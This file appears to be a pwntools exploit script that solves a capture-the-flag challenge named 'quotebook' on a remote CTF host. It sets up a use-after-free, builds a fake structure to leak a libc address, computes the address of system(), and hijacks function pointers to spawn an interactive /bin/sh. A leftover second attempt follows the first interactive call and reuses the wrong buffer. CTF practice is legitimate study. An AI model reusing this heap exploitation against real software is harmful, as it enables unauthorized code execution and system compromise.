#!/usr/bin/python
import pwn
import os


libc = pwn.ELF("./libc.so.6")

def insert_dummy_quote(s):
    s.sendline("2")
    s.recv()
    s.sendline("1")
    s.recv()
    s.sendline("1")
    s.recv()
    s.sendline("a")
    s.recv()
    s.sendline("a")
    s.recv()

def del_quote(idx):
    s.sendline("5")
    s.recv()
    s.sendline("%d" % idx)
    print(s.recv())
"""
s = pwn.process("./quotebook")
"""
s = pwn.remote("challs.dvc.tf", 2222)

s.recv()
for i in range(3):
    insert_dummy_quote(s)

print("Deleting quotes")
del_quote(1)
del_quote(2)

s.recv()
print("List quotes")
s.sendline("1")
print(s.recvuntil('number > '))

print("WTFBBQ")
# Craft UAF with title overwriting first quote_t structure
s.sendline("2")
print(s.recv())
# title size
s.sendline("1")
s.recv()
# content size
s.sendline("48")
s.recv()

#### Craft structure to leak libc ###
# Pack content and content size (puts addr in PLT)
buf = pwn.pack(0x4040c0, 64) + pwn.pack(1, 64)
# Pack title addr and size (printf addr in PLT)
buf += pwn.pack(0x404030, 64) + pwn.pack(8, 64)
# Set function pointers
buf += pwn.pack(0x401236, 64) + pwn.pack(0x401294, 64)

# send title
s.sendline("a")
print(str(s.recv(), 'ascii'))

# send content
s.sendline(buf)
print(str(s.recv(), 'ascii'))

# Display quote and trigger UAF
s.recv()
s.sendline("3")
print(s.recv())
s.sendline("1")

leaks_yolo = s.recv()
print("THIS IS SPARTAPZ")
print(leaks_yolo)
puts_leak = leaks_yolo[4:4+6]
print(puts_leak)
addr = pwn.unpack(puts_leak, 48)
libc_base = addr - libc.symbols["printf"]
system_addr = libc_base + libc.symbols["system"]
print("%x" % system_addr)

s.sendline("4")
s.recv()
s.sendline("2")
b = b"/bin/sh\x00" + pwn.pack(1, 64)
b += b"A"* 16
print(len(b))
b += pwn.pack(system_addr, 64) * 2
s.sendline(b)
print(str(s.recv(), 'ascii'))

s.sendline("3")
print(str(s.recv(), 'ascii'))
s.sendline("1")
s.interactive()

#b = b"/bin/sh\x00"
b = pwn.pack(0x4020c9, 64)*4
b = b + b"\x00" * (256 - len(b))
b += pwn.pack(system_addr, 64) * 2
s.sendline(buf)
print(str(s.recv(), 'ascii'))
# send content
s.sendline("a")
print(str(s.recv(), 'ascii'))

s.sendline("1")
print(s.recv())


s.sendline("3")
print(str(s.recv(), 'ascii'))
s.sendline("1")
s.interactive()
